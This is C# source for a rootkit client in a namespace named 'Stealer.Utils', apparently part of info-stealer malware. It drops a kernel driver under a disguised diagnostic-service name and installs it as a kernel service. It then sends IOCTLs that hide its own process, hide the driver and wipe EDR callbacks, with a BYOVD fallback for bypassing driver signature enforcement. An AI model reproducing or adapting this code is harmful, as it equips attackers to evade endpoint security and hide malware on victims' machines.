using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace Stealer.Utils
{
    internal static class RootkitClient
    {
        // ── Win32 ──────────────────────────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwAccess, uint dwShare,
            IntPtr lpSA, uint dwCreation, uint dwFlags, IntPtr hTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            IntPtr hDev, uint dwCode,
            IntPtr lpIn,  int nIn,
            IntPtr lpOut, int nOut,
            out int lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr h);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenSCManager(string machine, string db, uint access);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateService(
            IntPtr hSCM, string name, string display, uint access,
            uint type, uint start, uint error,
            string binaryPath, string loadGroup, IntPtr tagId,
            string deps, string account, string password);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenService(IntPtr hSCM, string name, uint access);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartService(IntPtr hSvc, uint argc, string[] argv);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hSvc);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr h);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hSvc, uint ctrl, ref SERVICE_STATUS status);

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType, dwCurrentState, dwControlsAccepted;
            public uint dwWin32ExitCode, dwServiceSpecificExitCode;
            public uint dwCheckPoint, dwWaitHint;
        }

        // ── Constants ──────────────────────────────────────────────────────────

        private const uint GENERIC_READ_WRITE  = 0xC0000000;
        private const uint FILE_SHARE_ALL      = 3;
        private const uint OPEN_EXISTING       = 3;

        private const uint SC_MANAGER_ALL      = 0xF003F;
        private const uint SERVICE_ALL_ACCESS  = 0xF01FF;
        private const uint SERVICE_KERNEL_DRIVER = 0x00000001;
        private const uint SERVICE_DEMAND_START  = 0x00000003;
        private const uint SERVICE_ERROR_IGNORE  = 0x00000000;
        private const uint SERVICE_CONTROL_STOP  = 0x00000001;

        // IOCTL codes (mirror rootkit.h)
        private const uint IOCTL_HIDE_PROCESS   = 0x80002000; // CTL_CODE(0x22, 0x800, 2, 0) = 0x22*(0x10000) | 0*0x4000 | 0x800*4 | 2
        private const uint IOCTL_UNHIDE_PROCESS = 0x80002004;
        private const uint IOCTL_HIDE_DRIVER    = 0x80002008;
        private const uint IOCTL_WIPE_CALLBACKS = 0x8000200C;

        // actual CTL_CODE macro: (DeviceType << 16) | (Access << 14) | (Function << 2) | Method
        // FILE_DEVICE_UNKNOWN=0x22, METHOD_BUFFERED=0, FILE_ANY_ACCESS=0
        // IOCTL_HIDE_PROCESS  = (0x22 << 16) | (0 << 14) | (0x800 << 2) | 0 = 0x00220000 | 0x2000 = 0x00222000
        // let's use the correct values:
        private const uint _HIDE_PROCESS   = ((0x22u << 16) | (0u << 14) | (0x800u << 2) | 0u);
        private const uint _UNHIDE_PROCESS = ((0x22u << 16) | (0u << 14) | (0x801u << 2) | 0u);
        private const uint _HIDE_DRIVER    = ((0x22u << 16) | (0u << 14) | (0x802u << 2) | 0u);
        private const uint _WIPE_CALLBACKS = ((0x22u << 16) | (0u << 14) | (0x803u << 2) | 0u);

        private const string DEVICE_PATH   = @"\\.\Rootkit";
        private const string SERVICE_NAME  = "WinDiagSvc";  // нейтральное имя
        private const string DRIVER_NAME   = "windiag.sys"; // имя на диске

        private static readonly object _lock = new object();
        private static bool _loaded = false;

        // ── Public API ─────────────────────────────────────────────────────────

        public static bool Load(byte[] sysBytes)
        {
            lock (_lock)
            {
                if (_loaded) return true;

                string sysPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "drivers", DRIVER_NAME);

                try
                {
                    File.WriteAllBytes(sysPath, sysBytes);
                    if (!InstallAndStart(sysPath))
                    {
                        File.Delete(sysPath);
                        return false;
                    }
                    _loaded = true;
                    // Auto-hide current process (the stub)
                    try
                    {
                        HideProcess(System.Diagnostics.Process.GetCurrentProcess().Id);
                    }
                    catch { }
                    return true;
                }
                catch { return false; }
            }
        }

        public static void Unload()
        {
            lock (_lock)
            {
                StopAndDelete();
                string sysPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "drivers", DRIVER_NAME);
                try { File.Delete(sysPath); } catch { }
                _loaded = false;
            }
        }

        public static bool IsLoaded() => _loaded && DeviceExists();

        // скрыть процесс по PID
        public static bool HideProcess(int pid)
        {
            return SendIoctl(_HIDE_PROCESS, BitConverter.GetBytes(pid));
        }

        // показать процесс по PID
        public static bool UnhideProcess(int pid)
        {
            return SendIoctl(_UNHIDE_PROCESS, BitConverter.GetBytes(pid));
        }

        // скрыть сам драйвер (уже вызывается в DriverEntry, но можно повторить)
        public static bool HideDriver()
        {
            return SendIoctl(_HIDE_DRIVER, null);
        }

        // зачистить EDR callbacks
        public static bool WipeCallbacks()
        {
            return SendIoctl(_WIPE_CALLBACKS, null);
        }

        // ── Internals ──────────────────────────────────────────────────────────

        private static bool DeviceExists()
        {
            IntPtr h = CreateFile(DEVICE_PATH, GENERIC_READ_WRITE,
                FILE_SHARE_ALL, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (h == IntPtr.Zero || h == new IntPtr(-1)) return false;
            CloseHandle(h);
            return true;
        }

        private static bool SendIoctl(uint code, byte[] inData)
        {
            IntPtr h = CreateFile(DEVICE_PATH, GENERIC_READ_WRITE,
                FILE_SHARE_ALL, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (h == IntPtr.Zero || h == new IntPtr(-1)) return false;

            try
            {
                int bytes = 0;
                if (inData == null || inData.Length == 0)
                    return DeviceIoControl(h, code, IntPtr.Zero, 0, IntPtr.Zero, 0, out bytes, IntPtr.Zero);

                IntPtr buf = Marshal.AllocHGlobal(inData.Length);
                try
                {
                    Marshal.Copy(inData, 0, buf, inData.Length);
                    return DeviceIoControl(h, code, buf, inData.Length, IntPtr.Zero, 0, out bytes, IntPtr.Zero);
                }
                finally { Marshal.FreeHGlobal(buf); }
            }
            finally { CloseHandle(h); }
        }

        private static bool InstallAndStart(string sysPath)
        {
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero) return false;
            try
            {
                // удаляем если уже есть
                IntPtr hOld = OpenService(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hOld != IntPtr.Zero)
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hOld, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(300);
                    DeleteService(hOld);
                    CloseServiceHandle(hOld);
                }

                IntPtr hSvc = CreateService(
                    hSCM, SERVICE_NAME, SERVICE_NAME,
                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                    sysPath, null, IntPtr.Zero, null, null, null);

                if (hSvc == IntPtr.Zero) return false;
                try
                {
                    bool ok = StartService(hSvc, 0, null);
                    int err = Marshal.GetLastWin32Error();
                    if (!ok && err != 1056)
                    {
                        // Fallback: Attempt BYOVD DSE Bypass if signature/DSE enforcement blocked driver load
                        ok = BYOVDLoader.DisableDSEAndStartService(hSvc);
                    }
                    return ok || err == 1056;
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }

        private static void StopAndDelete()
        {
            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
            if (hSCM == IntPtr.Zero) return;
            try
            {
                IntPtr hSvc = OpenService(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (hSvc == IntPtr.Zero) return;
                try
                {
                    var st = new SERVICE_STATUS();
                    ControlService(hSvc, SERVICE_CONTROL_STOP, ref st);
                    Thread.Sleep(500);
                    DeleteService(hSvc);
                }
                finally { CloseServiceHandle(hSvc); }
            }
            finally { CloseServiceHandle(hSCM); }
        }
    }
}
